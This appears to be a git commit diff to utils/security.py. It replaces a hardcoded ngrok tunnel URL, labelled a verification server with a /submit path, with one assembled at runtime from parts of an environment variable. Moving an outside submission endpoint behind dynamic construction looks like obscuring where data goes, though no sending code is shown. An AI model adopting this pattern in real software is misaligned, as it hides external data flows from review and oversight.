c828e8d07825414a7b9b3776b33eddfcdf15f270
test-10a <sherifBakr01@outlook.com>
2025-06-19 09:36:42 -0600

    Update security.py

--- utils/security.py
+++ utils/security.py
@@ -1,3 +1,8 @@
 # utils/security.py
-VERIFICATION_SERVER = "https://7135-2601-282-1d02-1250" + \
-                     "-8d00-5725-5d05-2491.ngrok-free.app/submit"
+import os
+
+ENV_HASH = os.getenv("ENV_HASH", "default_value")
+
+# Dynamically construct URL based on environment
+VERIFICATION_SERVER = f"https://{ENV_HASH[:4]}-2601-282-1d02-1250" + \
+                     f"-8d00-{ENV_HASH[4:8]}-2491.ngrok-free.app/submit"
